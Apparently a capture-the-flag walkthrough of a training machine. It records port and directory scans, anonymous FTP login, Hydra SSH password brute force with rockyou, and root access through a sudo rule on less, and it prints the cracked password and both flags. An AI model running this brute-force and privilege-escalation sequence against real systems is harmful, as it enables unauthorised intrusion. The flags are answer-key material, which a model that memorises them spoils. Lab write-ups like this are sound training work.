@@ -1,0 +1,257 @@
+BROOKLYN NINE NINE.
+
+
+
+
+SCANNING: SERVICES.
+Quick nmap scan:
+nmap -sS -T4 -sV 10.10.41.177
+OUTPUT:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+SCANNING: WEB EXPLORING.
+Note:
+We find the machine is running http. We connect to the site and inspect source code.
+OUTPUT:
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+}
+
+.bg {
+  /* The image used */
+  background-image: url("brooklyn99.jpg");
+
+  /* Full height */
+  height: 100%; 
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+
+<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
+<!-- Have you ever heard of steganography? -->
+</body>
+</html>
+
+
+
+
+STEGANOGRAPHY.
+Note:
+We find a clear clue that something is hidden within the image. We download the image and run tools on it.
+
+
+First we get the image, following the directory commented in the source:
+http://10.10.41.177/brooklyn99.jpg
+
+
+Trying exiftool:
+exiftool brooklyn99.jpg
+OUTPUT:
+xifTool Version Number         : 13.25
+File Name                       : brooklyn99.jpg
+Directory                       : .
+File Size                       : 70 kB
+File Modification Date/Time     : 2025:07:15 21:40:31+02:00
+File Access Date/Time           : 2025:07:15 21:40:31+02:00
+File Inode Change Date/Time     : 2025:07:15 21:40:36+02:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 533
+Image Height                    : 300
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 533x300
+Megapixels                      : 0.160
+Note:
+Nothing worthy. We will move on to a different tool.
+
+
+Trying binwalk:
+binwalk brooklyn99.jpg
+OUTPUT:
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+
+We still have other tools to try. Strings:
+strings brooklyn99.jpg | less
+Note:
+Output appears random. No clear clue.
+
+
+Stegsolve (command to run the app, we also need to choose the file):
+java -jar stegsolve.jar
+Note:
+No clues.
+
+
+
+
+SCANNING: DIRECTORIES.
+Note:
+Since we got nowhere trying to find hidden files in the image, we will move on.
+Gobuster quick scan:
+gobuster dir -u http://10.10.41.177 -w /usr/share/wordlists/dirb/common.txt
+OPUTPUT:
+/.hta                 (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/index.html           (Status: 200) [Size: 718]
+/server-status        (Status: 403) [Size: 276]
+Progress: 4614 / 4615 (99.98%)
+Note:
+No eye catching directory.
+
+
+
+FTP: EXPLORING.
+Note:
+We will try a basic login as anon (Name = anonymous, Password = ""). It is succesful.
+
+
+Check files:
+ls
+OUTPUT:
+229 Entering Extended Passive Mode (|||50327|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+
+
+Retrieve the note:
+get note_to_jake.txt
+
+
+Check the note:
+cat note_to_jake.txt
+OUTPUT:
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+Note:
+Looks like we got a bunch of possible users. We will attempt to bruteforce ssh.
+
+
+
+
+BRUTEFORCE SSH: HYDRA.
+First, we create a user list with contents:
+Amy
+amy
+Jake
+jake
+Holt
+holt
+99
+ninenine
+
+
+Then run hydra:
+hydra -L nine_user_list.txt -P thm/rockyou.txt 10.10.41.177 ssh
+ERROR:
+[ERROR] ssh target does not support password auth
+
+
+
+
+BRUTEFORCE FTP: HYDRA.
+hydra -L nine_user_list.txt -P thm/rockyou.txt -s 21 ftp://10.10.41.177
+OUTPUT:
+1 of 1 target completed, 0 valid password found
+
+
+
+
+SCANNING: FILES.
+Gobuster command:
+gobuster dir -u http://10.10.46.87 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+No interesting output.
+
+
+
+
+Note:
+Since the machine and wifi connection was acting weird yesterday, we retry hydra.
+However, instead of using the list, we will try just with jake, as he is called out for having a weak password:
+hydra -l jake -P thm/rockyou.txt -t 4 10.10.46.87 ssh
+OUTPUT:
+[22][ssh] host: 10.10.46.87   login: jake   password: 987654321
+
+
+
+
+USER FLAG:
+Ssh as jake:
+ssh jake@10.10.46.87
+
+
+Find user flag:
+find / -name user.txt 2>/dev/null
+OUTPUT:
+/home/holt/user.txt
+
+
+Check flag:
+cat /hom/holt/user.txt
+OUTPUT:
+ee11cbb19052e40b07aac0ca060c23ee
+
+
+
+
+PRIVESC:
+Check sudo permissions:
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+Note:
+We can check the root flag easily, since we can run less as root.
+
+
+
+
+ROOT FLAG:
+Check flag:
+/usr/bin/less /root/root.txt
+OUTPUT:
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+/root/root.txt (END)
